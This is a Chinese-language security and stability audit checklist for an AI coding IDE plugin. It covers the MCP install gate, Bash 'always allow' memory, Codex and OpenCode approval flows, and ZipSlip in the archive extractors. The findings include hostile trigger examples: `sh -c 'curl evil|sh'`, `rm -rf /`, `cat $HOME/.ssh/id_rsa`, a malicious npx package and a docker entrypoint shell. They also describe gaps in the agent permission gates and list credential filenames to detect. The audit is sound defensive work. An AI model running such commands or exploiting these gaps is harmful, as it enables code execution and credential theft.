# 插件全面排查发现清单

- **日期**:2026-07-31
- **分支**:feature/v0.4.9
- **范围**:AI 对话/流式输出、MCP 网关、Skills 市场、模型/provider 配置、工具调用/权限
- **方法**:5 路并行子 agent 深度审查 + 主线自审(未提交 diff、解压器、权限闸门、sessionId 防护)
- **状态约定**:`- [ ]` 待处理 / `- [x]` 已修复 / `~` 已验证健全(勿动)

## 覆盖度说明

| 领域 | 覆盖情况 |
|---|---|
| 对话/流式 | agent 1 完整 ✅ |
| MCP 网关 | agent 2 完整 ✅ |
| Skills 市场 | 主 agent 429 中断;子 agent 覆盖文档解析 ✅ + 主线自审 diff/解压器 ✅ |
| 模型/provider | 主 agent 429 中断;子 agent 覆盖前端 provider 切换 ✅ + 主线验证后端 sessionId ✅。**后端 ModelFetchService / SessionProviderRouter / canonical-role 归一化的深度审查受限,后续补** |
| 工具调用/权限 | agent 5 完整 ✅ |

> 置信度标注:`[已读原码确认]` = 主线亲自读过对应代码;`[agent 报告]` = 来自子 agent,给了 file:line 与触发构造,修复前建议快速复核。

## 优先级总览

- **P0(安全/稳定性,影响面大,改动内聚)**:SEC-01、SEC-02、STAB-01、STAB-02
- **P1**:SEC-03、SEC-04、STAB-03
- **P2**:STREAM-01..05、MCP-01..03、SEC-05..08、ARCH-01..02、SKILL-01..03
- **P3**:UI-01..03 及全部低危、死代码清理

---

## P0

### - [ ] SEC-01  MCP 安装权限闸门全面失效(任意命令可落盘执行) `[已读原码确认]`
- **位置**:
  - `src/main/java/com/github/claudecodegui/handler/mcp/McpMarketActionHandlers.java:200-209`(evaluateInstallRisk 信任前端 `server.riskLevel` 字面量,从不重算)
  - `src/main/java/com/github/claudecodegui/handler/mcp/McpServerActionHandlers.java:88,109`(ADD_MCP_SERVER / UPDATE_MCP_SERVER 完全不经闸门,直接 upsertMcpServer)
  - `src/main/java/com/github/claudecodegui/service/SmitheryMarketService.java:251,276,300`(Smithery 详情原样透传 connection.command/args/env,不计算 riskLevel)
  - Codex 侧:`CodexMcpServerActionHandlers.java:157-203` 同样无闸门
- **问题**:唯一后端闸门 evaluateInstallRisk 只挂在 INSTALL_MCP_FROM_MARKET 一个 action,且读前端回传值。三条绕过:① 篡改 riskLevel 为 `local-command`/删字段;② Smithery/手动路径根本不带 riskLevel(null 放行);③ ADD/UPDATE 写入口完全旁路。
- **触发**:`{command:"sh",args:["-c","curl evil|sh"]}` 可一键落盘进 `~/.claude.json` 交 CLI 执行。单测 `McpMarketActionHandlersInstallTest.java:54-57` 把"riskLevel 缺失=放行"固化。
- **修复**:把 command/args 风险校验下沉到 `upsertMcpServer`(或 CodemossSettingsService)单一入口,所有写路径统一过闸门;**后端从 command/args 独立重算 riskLevel**(复用 `McpRegistryEntryMapper.hasDangerousRunnerArg`),永不信任 payload 字段;缺失 riskLevel 默认拒绝。
- **来源**:主线自审 + agent 5

### - [ ] SEC-02  Bash/Edit「总是允许」按 toolName 记 tool-level 记忆 `[agent 报告]`
- **位置**:`src/main/java/com/github/claudecodegui/permission/PermissionService.java:361-363`(decisionStore.rememberToolDecision("Bash", ALLOW_ALWAYS));对照 fallback 路径 `:391-393`(rememberParameterDecision 按 command)。前端入口 `PermissionActionHandlers.java:348`(remember=true)。
- **问题**:对一个 `npm test` 勾选"总是允许"→ 会话内**任意** Bash(含 `rm -rf /`)在 `getToolDecision("Bash")`(`:306-314`)直接放行,不再弹窗、不再 per-command 校验。两条审批路径语义分裂。
- **修复**:Bash/Agent 类执行工具的 ALLOW_ALWAYS 一律走 parameter-level(按 command 串)。
- **来源**:agent 5

### - [x] STAB-01  MCP stdio-client stdin 无 error 监听,可致整个 gateway 崩溃 `[agent 报告]`
- **位置**:`ai-bridge/mcp-gateway/transport/stdio-client.js:67,131-132`
- **问题**:stdout 经 FramedReader 监听了 error(`:76`),stdin 完全没有。子进程退出后 stdin 关闭触发异步 EPIPE,Node 对无监听器的 `'error'` 默认 throw → uncaughtException → 整个 gateway Node 进程崩溃,所有 provider 失去 MCP 工具。
- **修复**:`this.process.stdin.on('error', e => this.rejectAll(e))`,与 process error/exit listener 对齐。
- **来源**:agent 2

### - [x] STAB-02  坏 MCP server 崩溃后 client 不重建,后续请求挂满 15s `[agent 报告]`
- **位置**:`ai-bridge/mcp-gateway/transport/stdio-client.js:83`(process.on('exit') 只 rejectAll 当前 pending)
- **问题**:exit 时不置 `this.errored`、不清 `this.client`;supervisor 的 `if(!this.client)` 守卫失效(死 client 仍非 null),后续 refresh 继续调死 client 的 listTools 写已关闭 stdin → 等满 `DEFAULT_REQUEST_TIMEOUT_MS=15000` 才超时。坏 MCP 反复触发持续拖慢首屏。
- **修复**:exit listener 中置 `this.client=null` + `this.errored`,让下次 refresh 重建 client、request 立即失败。
- **来源**:agent 2

---

## P1

### - [ ] SEC-03  OpenCode 完全无 plugin 侧工具权限门 `[agent 报告]`
- **位置**:`ai-bridge/services/opencode/message-service.js:153-157`;`src/main/java/com/github/claudecodegui/cli/opencode/OpenCodeCliSession.java:178-179,201,402-404`;tool_use 仅事后渲染 `ai-bridge/services/opencode/event-mapper.js:273`
- **问题**:permissionMode 从 UI 透传到 stdin 后被静默丢弃,tool_use 纯粹事后渲染(工具已在外部 opencode 进程执行完)。CLI 路径 default/plan/acceptEdits 不加任何 flag,还 `pb.redirectInput(stdinNullSink())` 掐断 opencode 原生询问通道。
- **修复**:UI 明示"OpenCode 工具由 opencode 原生策略管控,本插件不拦截";停止收集 permissionMode 以免误导;或实现 tool_use→Java 弹窗→回灌(serve API,工程代价大)。
- **来源**:agent 5

### - [ ] SEC-04  Codex 命令审批 fire-then-ask + Windows default 无沙箱 `[agent 报告]`
- **位置**:`ai-bridge/services/codex/codex-event-handler.js:989,669-690`(命令审批在 item.started,命令已启动);`ai-bridge/utils/permission-mapper.js:177-181`(Windows default→sandbox='danger-full-access')
- **问题**:命令审批在 `item.started`(命令已启动)时才问,deny 仅事后 abort controller(自承 "command may have already started"),与 Claude canUseTool 的 SDK 同步事前门是根本架构差异。叠加 Windows default=danger-full-access。
- **修复**:UI 显式标注 Codex 权限为"事后中止"降级;Windows default 至少保留 `workspace-write` + 显式风险提示;或注册 SDK 原生 approval callback。
- **来源**:agent 5

### - [x] STAB-03  Codex SDK 子进程 waitFor() 无超时,可耗尽 commonPool `[agent 报告]`
- **位置**:`src/main/java/com/github/claudecodegui/provider/codex/CodexSDKBridge.java:625`(无参 process.waitFor());对照 `BaseSDKBridge.executeStreamingCommand:337` 有 `waitFor(requestTimeoutMs, MS)`
- **问题**:per-process 路径用 `CompletableFuture.supplyAsync`(默认 ForkJoinPool.commonPool)包装,L625 无限阻塞。Node 子进程网络读卡住即永久占用 JVM 全局共享线程池,累积耗尽。三处 fallback 命中(accessMode=INACTIVE、bridgeDir 缺失、daemon 不可用,`sendMessageWithDaemonPreferred:693/698/706`)。
- **修复**:改 `waitFor(CLI_REQUEST_TIMEOUT_MS, MS)`,超时后 `terminateProcess` + 设 timeout 错误。
- **来源**:agent 1

---

## P2 — 流式/对话(STREAM)

### - [x] STREAM-01  CliSessionManager send/disposeTab 竞态致孤儿 CLI 进程 `[agent 报告]`
- **位置**:`src/main/java/com/github/claudecodegui/cli/CliSessionManager.java:96↔159-181`
- **问题**:send 在 L96 检查 `disposedTabs.contains` 无锁,到 L107 inFlight.compute 非原子;disposeTab 在两步间执行完毕后,send 的 compute 仍经 resolveSession→sessions.computeIfAbsent 重建 CliSession 并重启 CLI 子进程,产生孤儿。
- **修复**:在 compute 持锁区内重检 disposedTabs。
- **来源**:agent 1

### - [x] STREAM-02  CodexSDKBridge per-process sendMessage 绕过对称保护 `[agent 报告]`
- **位置**:`src/main/java/com/github/claudecodegui/provider/codex/CodexSDKBridge.java:443-667`
- **问题**:自实现 sendMessage 跳过 BaseSDKBridge 的 ①15min 绝对超时 ②beginChannel/finishChannel 互斥与中断时序 ③awaitOutputDrain 有界收尾 ④stdin 写失败传播。同一 channelId 并发调用在 activeChannelProcesses 互相覆盖,旧 Process 引用丢失无法回收。
- **修复**:复用 executeStreamingCommand 或补齐超时+互斥+drain。
- **进度(2026-07-31)**:STAB-03 补齐 ①15min 绝对超时 + ③awaitOutputDrain 有界收尾;第 4 批补齐 ②beginChannel/finishChannelStart 互斥与中断时序(对齐 BaseSDKBridge,关闭「interrupt 在 registerProcess 前到达被丢失」窗口 + 清旧 interruptedChannels 标记)+ ④stdin 写失败传播(hadSendError + terminateProcess + safeOnError,exitCode 分支经 `result.error != null` 守卫防双重报错)。①②③④ 全齐。
- **来源**:agent 1

### - [x] STREAM-03  MessageMerger findLastSameTypeBlockIndex 忽略 consumed 致内容丢失 `[agent 报告]`
- **位置**:`src/main/java/com/github/claudecodegui/session/MessageMerger.java:268-291`
- **问题**:fallback 扫尾段时不检查 consumedUnkeyedIndexes;单个 assistant 快照含多个无 key 的不相关 text/thinking 块时,第二个块 fallback 合并到已被第一个块合并的目标,经 preferMoreCompleteContent 取较长者,可能丢较短块。
- **修复**:fallback 中跳过 consumedUnkeyedIndexes,或同类型块已 consumed 时改 append。
- **来源**:agent 1

### - [x] STREAM-04  OpenCode tool_result 提前发射,失败显示为成功 `[agent 报告]`
- **位置**:`ai-bridge/services/opencode/event-mapper.js:293`
- **问题**:发射条件 `status==='completed' || (output!=null && output!=='')`。流式输出工具在 running 阶段已携非空 output 即提前发 tool_result(is_error 取当前非 completed=false),随后 callId 进 toolResultEmitted,真正的 completed/failed 被丢弃 → 失败工具显示成功。
- **修复**:tool_result 仅在终态(completed/error/failed)发射。
- **来源**:agent 1

### - [x] STREAM-05  OpenCode role 判定顺序倒置,user 文本泄漏为 assistant `[agent 报告]`
- **位置**:`ai-bridge/services/opencode/event-mapper.js:153-155`
- **问题**:role 判定依赖 `message.updated` 严格先于 `part.updated`(注释 L13-14 承认)。顺序倒转(网络重排/serve 差异)时,part.updated 未命中 role 返回 undefined,`role==='user'` 守卫失效,user 消息 text part 被当 assistant content_delta 推送,污染助手回复。
- **修复**:part.updated 缺 role 时安全跳过(缓存待 message.updated 到达)。
- **来源**:agent 1

## P2 — MCP 网关(MCP)

### - [x] MCP-01  McpGatewayService dispose/自愈 race 致孤儿进程+端口占用 `[agent 报告]`
- **位置**:`src/main/java/com/github/claudecodegui/mcp/McpGatewayService.java:299-329`
- **问题**:onGatewayProcessExit 自愈与 dispose() 存在 race。dispose 持锁 setOnExitCallback(null)+stop(),但**不像 stopGateway() 那样置 processHandle=null**;自愈的 runAsync 等到锁后进入,`if(processHandle==null)` 早退失败,进入 ensureStarted 在已 disposed service 上重启 Node → 孤儿进程。
- **修复**:dispose() 末尾同步置 `processHandle=null; bridgeClient=null;`(与 stopGateway 对齐);或自愈回调入口加 `if(project.isDisposed()) return;`。
- **来源**:agent 2

### - [x] MCP-02  tools/call 复用 5s 超时,正常工具调用误判失败 `[agent 报告]`
- **位置**:`ai-bridge/mcp-gateway/gateway-http-client.js:23`(DEFAULT_TIMEOUT_MS=5000);经 `httpClient.post('/runtime/tools/call')` 同样 5s
- **问题**:5s 为 tools/list(本地秒回)设计;tools/call 无降级(对照 runToolsList 有),超时直接 throw → JSON-RPC error → 工具调用报告失败。>5s 的 DB 查询/Web 抓取/代码执行均误判。
- **修复**:tools/call 路径显式传更长 timeout(如 60s 或读 config.request_timeout_ms)。
- **来源**:agent 2

### - [x] MCP-03  DANGEROUS_RUNNER_FLAGS 不完整 `[agent 报告]` `[已读原码确认]`
- **位置**:`src/main/java/com/github/claudecodegui/mcp/marketplace/McpRegistryEntryMapper.java:31-33`
- **问题**:列表缺 `--entrypoint`/`-e`/`--env`/`-u`/`--user`/`-w`/`--workdir`。docker registry type 默认 riskLevel=container-command(非 unverified),只有含列表内 flag 才降级。`docker run -e KEY=VAL --entrypoint /bin/sh image` 保持信任级别,UI 不显著警告。与 SEC-01 叠加放大风险。
- **修复**:扩展 DANGEROUS_RUNNER_FLAGS 至少包含上述 flag。
- **来源**:agent 2 + 主线

## P2 — 权限沙箱(SEC)

### - [x] SEC-05  isDangerousPath 不展开 $HOME 环境变量 `[agent 报告]` `[已读原码确认]`
- **位置**:`ai-bridge/permission-safety.js:226-232`(只 `split('~/')` 展开 ~)
- **问题**:Bash 命令 `cat $HOME/.ssh/id_rsa` 或 `cat "$HOME"/.ssh/id_rsa` 的 command 字符串不含字面 `~/` 也不含真实 home 路径,不匹配 `${userHomeDir}/.ssh/` 模式,绕过 Node 侧 dangerous path 硬拒(canUseTool `:163-173`)。`$HOME`、`${HOME}`、`/home/$USER` 均漏。
- **修复**:对 command 字段额外展开常见 shell 变量,或对 Bash 命令做更保守关键词筛查(`.ssh`、`id_rsa`、`.aws/credentials` 直接匹配)。
- **来源**:agent 5 + 主线

### - [ ] SEC-06  riskLevel 不挡 known runner 跑恶意包名 `[agent 报告]` `[已读原码确认]`
- **位置**:`src/main/java/com/github/claudecodegui/mcp/marketplace/McpRegistryEntryMapper.java:261-283`
- **问题**:runner 在 npx/uvx/docker 白名单内 → 无条件 local-command(放行)。`npx -y evil-trojan-pkg`(postinstall 任意代码执行)、`uvx evil-pkg` 通过闸门。
- **修复**:gate 无法单独覆盖,需 UI 对包名二次确认 + 默认对非官方/低信誉包拒绝。
- **来源**:agent 5 + 主线

### - [x] SEC-07  isPlanFilePath 用 startsWith(cwd) 无 `/` 边界 `[agent 报告]`
- **位置**:`ai-bridge/services/claude/permission-mode.js:79`
- **问题**:cwd=`/a/proj` 时,`/a/project-evil/PLAN.md` 通过 startsWith('/a/proj') 校验,plan 模式可写 cwd 同前缀兄弟目录。限于 plan 模式 + 文件名必须 PLAN.md,实战影响有限。
- **修复**:`startsWith(normalizedCwd + '/')` 且用 path.relative 判断非负。
- **来源**:agent 5

### - [x] SEC-08  Codex patch 回滚用 indexOf 不可靠,失败 UI 误报 `[agent 报告]`
- **位置**:`ai-bridge/services/codex/codex-event-handler.js:575,855-885,641`
- **问题**:patch 审批在 item.completed(文件已改完),denied 走 rollbackSinglePatchOperation 用 `currentContent.indexOf(newString)` 定位:newString 多次出现只回滚第一个,可能错位;回滚失败时文件保持已改但 UI 显示"denied and rolled back"。
- **修复**:回滚改用精确区间(记录 offset/行号);回滚失败 UI 显式标注"文件仍处已修改状态"。
- **来源**:agent 5

## P2 — 解压器(ARCH)

### - [x] ARCH-01  unzipArchive 优先系统解压,绕过 ZipSlip 防御 `[已读原码确认]`
- **位置**:`src/main/java/com/github/claudecodegui/bridge/BridgeArchiveExtractor.java:110-152`(executeSystemUnzip:Windows `tar -xf`/Unix `unzip`),Java 回退 `unzipWithJava:158-185` 才有 startsWith 校验
- **问题**:系统 unzip/tar 默认会解压 `../` 到目标外,完全绕过 Java 路径校验。同类 extractTarGz 方法(`:248-249` 注释)已特意禁用系统工具防此问题,zip 路径遗漏。若 ai-bridge zip 源自外部不可信下载则可路径穿越。**需先确认 ai-bridge zip 来源是否可信。**
- **修复**:对不可信来源禁用系统解压走纯 Java;或系统解压后补做 startsWith 扫描。
- **来源**:主线

### - [x] ARCH-02  tar.gz 未显式拒绝符号链接条目 `[已读原码确认]`
- **位置**:`src/main/java/com/github/claudecodegui/bridge/BridgeArchiveExtractor.java:264-280`(extractTarGzWithJava)
- **问题**:ZipSlip 只校验 entry.getName() 路径,未校验条目类型。tar 的符号链接条目(isSymbolicLink/isLink,getLinkName 可指向 targetDir 外)未显式拒绝,仅靠 FileOutputStream 把 symlink 降级为普通文件的副作用间接阻断。防御深度不足,未来改 Files.copy 易引入 symlink 漏洞。
- **修复**:显式 `if(entry.isSymbolicLink() || entry.isLink()) throw/continue`。
- **来源**:主线

## P2 — Skills(SKILL)

### - [x] SKILL-01  无界 Files.readString 致 IDE OOM `[agent 报告]`
- **位置**:`src/main/java/com/github/claudecodegui/skill/SkillFrontmatterParser.java:88,256`;`src/main/java/com/github/claudecodegui/service/SkillDocumentService.java:49,84,107`
- **问题**:Files.readString 无大小上限,恶意/超大 SKILL.md 致 OOM。YAML 的 setCodePointLimit(8192) 只限解析子串,不限全文件 slurp;MAX_BODY_LENGTH=1MB 只校验被编辑 body,不限磁盘读取。
- **修复**:读取前校验 Files.size 上限,或用有界流式读。
- **来源**:agent(子)a1ab29ec

### - [x] SKILL-02  原子替换不保留原文件权限 `[agent 报告]`
- **位置**:`src/main/java/com/github/claudecodegui/skill/AtomicSkillDocumentWriter.java:28+75-82`
- **问题**:Files.createTempFile 无 FileAttribute 创建默认 0600 文件;Files.move(temp,target,REPLACE_EXISTING) 后 live 文件继承 temp 属性而非原文件。原 0644 文件首次编辑后变 0600。
- **修复**:move 前读原文件 POSIX 权限并 PosixFileAttributes 回写,或用 copyAttributes。
- **来源**:a1ab29ec

### - [x] SKILL-03  SkillDocumentService 宽 catch 掩盖 bug + restore 失败留 corrupt `[agent 报告]`
- **位置**:`src/main/java/com/github/claudecodegui/service/SkillDocumentService.java:117-124`
- **问题**:catch(Exception) 把 RuntimeException 编程 bug 伪装成"校验失败";若 writer.restore() 自身抛 IOException,异常逃逸到外层 catch(IOException),用户只看到通用"Failed to save",文件留 corrupt + 孤儿 .codemoss.bak。
- **修复**:收窄 catch;restore 失败时 result 显式标注"回滚失败,文件可能已损坏"。
- **来源**:a1ab29ec

---

## P3 — 前端状态残留(UI)

### - [ ] UI-01  provider 切换漏清 tokenDetail + 多项跨 provider 残留 `[agent 报告]`
- **位置**:`webview/src/hooks/useSessionManagement.ts:115-157`(beginSessionTransition 清了 usage* 漏 setTokenDetail);`useModelProviderState.ts:178-180,302-304`(longContextEnabled 自动 reset 仅 claude 分支);`useCodexProvider.ts:14-15`(reasoningEffort/codexFastMode 被 opencode 共用不重置)
- **问题**:切 provider 后 tokenDetail 残留旧值直到下次 usage 事件;longContextEnabled/reasoningEffort/codexFastMode 跨 provider 残留。
- **修复**:beginSessionTransition 补 setTokenDetail(undefined);评估 longContextEnabled/reasoningEffort 是否应 per-provider 化或切换时重置。
- **来源**:agent(子)ab1745c

### - [ ] UI-02  id=actualModel 同化致编辑后 selectedModel 静默回退 `[agent 报告]`
- **位置**:`webview/src/components/settings/ModelRegistrySection/ModelEditDialog.tsx:64-65`;触发 `useModelProviderState.ts:234-245`
- **问题**:claude/opencode 自定义模型保存时 id 强制等于 actualModel。改 actualModel → id 变 → toKey 变 → 旧 key 条目被当"删旧+增新"处理;selectedXxxModel 旧 id 不命中新 registry → 静默回退到第一个模型。
- **修复**:编辑自定义模型时保持 id 稳定(用持久 id,actualModel 独立字段),或回退时提示用户。
- **来源**:ab1745c

### - [ ] UI-03  ModelRegistrySection 本地 state 与模块级 currentRegistry 分裂 `[agent 报告]`
- **位置**:`webview/src/components/settings/ModelRegistrySection/index.tsx:33,91-95`
- **问题**:persistRegistry 乐观 setRegistry(本地)+ 发后端;模块级 currentRegistry 等后端 MODEL_REGISTRY_UPDATED 回执才更新。期间 SettingsPanel 显示新值,聊天界面(读模块级)显示旧值;失败时本地不回滚。
- **修复**:失败时回滚本地乐观值;或统一单一数据源。
- **来源**:ab1745c

---

## P3 — 低危与代码卫生(节选)

> 逐项可按需展开;以下为入口清单,详细 file:line 见各 agent 报告原文。

### 流式/对话低危
- [ ] `session/ClaudeMessageHandler.java:212-214` 与 `CodexMessageHandler.java:214-216`:onError 跳过 notifyStreamCompleted → 错误时不触发 history 刷新(JSONL 与内存态可能不同步)。
- [ ] `session/CodexMessageHandler.java:582-586,623-625`:`getAsInt()` 无 isJsonNull 守卫,JsonNull 时抛异常被外层静默吞,usage 丢失。
- [ ] `session/CodexMessageHandler.java:1184-1191`:handleBlockReset 不检查 isStreaming 就清空状态(对比 Claude 的 handleNewTurnStart 有守卫)。
- [ ] `session/CodexMessageHandler.java:213,217`:onError 冗余两次 notifyMessageUpdate。
- [ ] `session/ReplayDeduplicator.java:95-100`:tail-match 兜底可吞掉匹配快照尾串的短 delta("the"/"is"/"ok");瞬时缺口,stream_end 自愈。
- [ ] `provider/codex/CodexSDKBridge.java:602-607`:stdin 写失败仅 log warn,空响应可能报 success(不设 hadSendError/result.error);`BaseSDKBridge:324-329` 同构。
- [ ] `session/runtime/CodexCliResolver.java:209-242`:InterruptedException 被 catch(Exception ignored) 吞,中断标志丢失。
- [ ] `ClaudeCliSessionRuntime.java:50-53`/`CodexCliSessionRuntime.java:49-52`/`OpenCodeCliSessionRuntime.java:49-52`:toCliSendRequest 的 tabId fallback 是死代码(RuntimeKey 强制 tabId 非空)。

### MCP 网关低危
- [ ] `ai-bridge/mcp-gateway/state-file.js:19-22`:writeStateFile 非原子写(注释却称原子),跨进程读者可能读部分 JSON。
- [ ] `ai-bridge/mcp-gateway/revision-store.js:51-54`:get() 返回内部引用未拷贝(put 时深拷贝),允许污染。
- [ ] `ai-bridge/mcp-gateway/ipc-server.js:113-142`:applySnapshot 期间新 /snapshot 请求可交错,瞬时不一致(最终一致)。
- [ ] `ai-bridge/mcp-gateway/framing.js:79-161` + `ipc-server.js:172-186`:无消息/缓冲区大小上限,超大 NDJSON/Content-Length 撑爆内存(信任边界内,低 DoS)。
- [ ] `mcp/McpGatewayProcessHandle.java:106-123`:Unix process.destroy() 只杀直接子进程,MCP server 的孙子进程成孤儿(Windows 走 taskkill /T 递归)。

### 权限/工具低危
- [ ] `permission-safety.js:141-176`:checkPathSafetyForAutoEdit / isAcceptEditsAllowed 定义但**全仓无调用方(死代码)**;acceptEdits 下 EDIT_TOOLS 直接 YIELD_TO_SDK 不走这两个函数。
- [ ] `permission/PermissionManager.java:39` + `session/ClaudeSession.java:55`:PermissionManager 整体死代码,createRequest(含 acceptEdits CWD 验证)从未被调用 → 该保护意图从未生效。
- [ ] `ai-bridge/services/opencode/event-mapper.js:301`:OpenCode tool_result 无大小上限(Claude 有 truncateToolResultBlock 20000,Codex 有 truncateForDisplay)。
- [ ] `ai-bridge/services/claude/mcp-status/command-validator.js:61`:SHELL_METACHARACTER_REGEX 在 Windows useShell 场景未拦 `%VAR%` 展开和 `^` 转义;且 warn-only 非硬拒。

### Skills 低危
- [ ] `skill/SkillFrontmatterParser.java:156-168`:name 缺失时 fallback 用目录名,未走 isValidSkillName 校验(不一致;OS 保证单路径分量,影响仅显示)。
- [ ] `skill/SkillFrontmatterParser.java:281`:CRLF 空行检测 bug(`indexOf("\n\n")` 漏 `\r\n\r\n`),首段描述提取跑到 body 末尾。
- [ ] `skill/SkillDocumentService.java:29`:FILE_LOCKS 静态 HashMap 永不清除(computeIfAbsent 无 evict),长跑 IDE 慢泄漏。
- [ ] `skill/AtomicSkillDocumentWriter.java:17,27`:固定 `.codemoss.bak` 名跨进程竞争;JVM 崩溃留孤儿 `.codemoss-skill-*.tmp`(无启动扫描)。
- [ ] `skill/SkillDocumentCodec.java:168-170`:duplicate-key 拒绝只覆盖 editable 字段,非 editable 重复键被 SnakeYAML 静默合并。
- [ ] `skill/SkillFrontmatterParser.java:141` vs `SkillDocumentCodec.java:26`:YAML code-point limit 不一致(8192 vs 65536),8K-64K frontmatter 在 codec 通过但 parser 返回 null。

### 前端低危
- [ ] 三模型 id 初始值不对称:`useClaudeProvider.ts:12`=`'claude-role-sonnet'`,另两个 `''`。
- [ ] permissionMode 三 provider 不对称:claude/codex 各独立存储,opencode 无独立存储(强制 'default')。
- [ ] `useModelProviderState.ts:211` 与 `useSessionManagement.ts:203,216`:SET_SESSION_PROVIDER 与 SET_PROVIDER 双事件语义重叠。

---

## ✅ 已验证健全(勿重复修复)

> 排查中确认这些**当前无问题**,列入以防误报或重复劳动。部分为历史 bug 的修复验证。

- **跨 provider sessionId 污染防护**:`SessionState.setProvider:253-267` 白名单校验 + 跨 provider 清 sessionId + 同 provider 保留续接。无回归。
- **epoch 守卫三 provider 对称**:Codex/OpenCode 复用 CodexMessageHandler,handler 逐 send 绑定 epoch。
- **turnUsage 在 streaming 被覆盖**:`ClaudeMessageHandler` 流式纯文本轮次以 `[USAGE]` 标签为权威源,handleAssistantMessage 仅含 tool_use 时覆盖且为最终值。无回归。
- **流式分片丢失/乱序**:StreamDeltaThrottler 的 lock 内 scheduled=false+drain 顺序正确;StreamMessageCoalescer schedulePush→drain→reschedule,stream_end 经双路径(主 flush 回调 + 300ms Alarm)+ turn 令牌守卫保证 onStreamEnd 必达。无回归。
- **throttler 死锁/定时器不触发**:flushPending 异常被捕获不杀调度线程;scheduled 标志保证单次调度。无回归。
- **ReplayDeduplicator 误删**:offset 主路径与 tail-match 兜底正常顺序正确;仅在 streamingText>已显示长度时激活。无回归。
- **webview 无 XSS/autoApprove 持久化/channelId 重放**:React 文本子节点自动转义;16 处 dangerouslySetInnerHTML 全喂 DOMPurify/静态图标;倒计时到期走拒绝(`PermissionDialog.tsx:41-45`);remember 不前端持久化;channelId 全用 request.channelId。
- **文件 IPC token 防伪造**:`permission-ipc.js` fail-closed,响应须 echo per-request UUID token;Java 侧 PermissionFileProtocol.registerRequestToken 对称校验。
- **Java ProcessBuilder 无 shell 注入**:全用预定义命令(node/claude/codex/tar),无一处从 mcpServers.command 取值拼 shell;MCP command 交 CLI 执行不在插件进程内。
- **MCP gateway 鉴权**:32B SecureRandom token + 127.0.0.1 loopback + Bearer 校验(security.js)。
- **MCP 首次请求慢**:BridgePreloader.prewarmMcpGateway 预热 + REUSE_PROBE_TIMEOUT=60s + configHash 幂等。
- **连接失败非阻塞降级**:runToolsList 不可达返回 {tools:[]} + stderr 标记,Java 端 GatewayDownMatcher 上行 toast;buildCliConfig/buildSdkMcpServers 异常 fallback disabled 直连。
- **SkillFrontmatterParser.isValidSkillName**:`^[a-z0-9]([a-z0-9-]*[a-z0-9])?$` + 禁连续连字符,严格约束 name(无 `/`/`\`/`:`/NUL/`..`/空格/大写),路径穿越不可行。
- **YAML billion-laughs**:两 parser 均 setMaxAliasesForCollections(0)。
- **原子写核心**:AtomicSkillDocumentWriter 的 temp+fsync+ATOMIC_MOVE 是正确模式,清理-on-失败 已处理。
- **Skills 扫描无递归 DoS**:scanSkillsAsCommands 单层 listFiles;命令扫描 scanCommandsRecursive 有 MAX_COMMAND_SCAN_DEPTH=10。
- **当前分支未提交改动**:Skills raw→Contents API、Smithery 重试、deferred-reload 重构、bridge.ts 注释 — 均经核查等价/正确,未引入新 bug。

---

## 附:建议修复批次

| 批次 | 内容 | 预估风险 | 建议顺序 |
|---|---|---|---|
| 第 1 批 | SEC-01 + SEC-02(MCP 闸门下沉 + Bash always-allow 改 parameter-level) | 中(动权限核心,需补单测) | 先做,独立内聚 |
| 第 2 批 | STAB-01 + STAB-02(stdio-client 两项) | 低(纯 Node 补 listener/置 null) | 改动小收益大 |
| 第 3 批 | SEC-03 + SEC-04 + STAB-03(Codex/OpenCode 权限降级 UI + waitFor 超时) | 中 | |
| 第 4 批 | STREAM-01..05(流式中危) | 中(动 session 核心) | 需回归测试 |
| 第 5 批 | MCP-01..03、SEC-05..08、ARCH-01..02、SKILL-01..03 | 低-中 | |
| 第 6 批 | UI-01..03 + 全部低危 + 死代码清理 | 低 | 收尾 |

> 每批修复后跑相关定向测试(见 AGENTS.md §9):Java 改动跑 `./gradlew test -x buildWebview -x instrumentTestCode`;ai-bridge 从仓库根 `node --test ai-bridge/...`;webview 在 webview 目录用 vitest。勿全量基线对比。

---

## 第五批修复进度(2026-07-31)

| 条目 | 状态 | 落地 |
|---|---|---|
| MCP-01 | ✅ | `McpGatewayService.dispose()` 末尾置 `processHandle=null;bridgeClient=null`(对齐 stopGateway);`onGatewayProcessExit` 加 `project.isDisposed()` 早退(竞态双保险) |
| MCP-02 | ✅ | `gateway-http-client` 新增 `TOOLS_CALL_TIMEOUT_MS=60s`;`gateway-stdio-client` 两处 `tools/call` 传入(不再复用 5s 默认误判失败) |
| MCP-03 | ✅(早前已修) | `DANGEROUS_RUNNER_FLAGS` 已在 `McpCommandRiskEvaluator:53-56` 补全(`--entrypoint/-e/--env/-u/--user/--workdir/-w` 等) |
| SEC-05 | ✅ | `isDangerousPath` 扩展 `$HOME/${HOME}/$USERPROFILE/$USER` 变量展开 + 凭证文件名兜底直配(id_rsa/.aws/credentials/.npmrc 等) |
| SEC-06 | ⏸️ 架构限制 | **本批不改**。本地无法判定包信誉,install 流程已有 McpConfirmDialog 确认 + SEC-01 闸门兜底;真正修复需包信誉服务(超插件定位)或对所有 npx/uvx 加额外确认(拖累体验)。单独立项 |
| SEC-07 | ✅ | `isPlanFilePath` 改 `startsWith(cwd+'/')` + 精确等于,移除无边界 `startsWith(cwd)` 裸分支 |
| SEC-08 | ✅ | `rollbackSinglePatchOperation`:`indexOf≠lastIndexOf` 判 ambiguous 失败,对接 rollback-failed UI(UI 误报部分早前已在 emitSyntheticPatchOperations/handleFileChange 修复) |
| ARCH-01 | ✅ | 系统解压前用 `hasTraversalEntry` 预检 zip entry 名,逃逸则走纯 Java(defense-in-depth;zip 已确认嵌入式可信) |
| ARCH-02 | ✅ | `extractTarGzWithJava` 显式 `isSymbolicLink()||isLink()` 拒绝链接条目 |
| SKILL-01 | ✅ | `SkillFrontmatterParser.MAX_SKILL_FILE_SIZE=8MB` public 常量,各 `Files.readString` 前校验 `Files.size`(Parser + SkillDocumentService 复用) |
| SKILL-02 | ✅ | `AtomicSkillDocumentWriter` replace 前快照 POSIX 权限、replace 后 `setPosixFilePermissions` 回写(非 POSIX 跳过) |
| SKILL-03 | ✅ | `save` 的 `restore()` 包 try-catch,失败返显式"回滚失败,文件可能损坏"(宽 catch 部分早前已修为分类 catch) |

---

## 第六批修复进度(2026-07-31)

| 条目 | 状态 | 落地 |
|---|---|---|
| UI-01 | ✅ | `beginSessionTransition` 补 `setTokenDetail(undefined)` 清理残留;`handleProviderSelect` 切换 provider 时重置 `reasoningEffort`/`codexFastMode` 到默认值 |
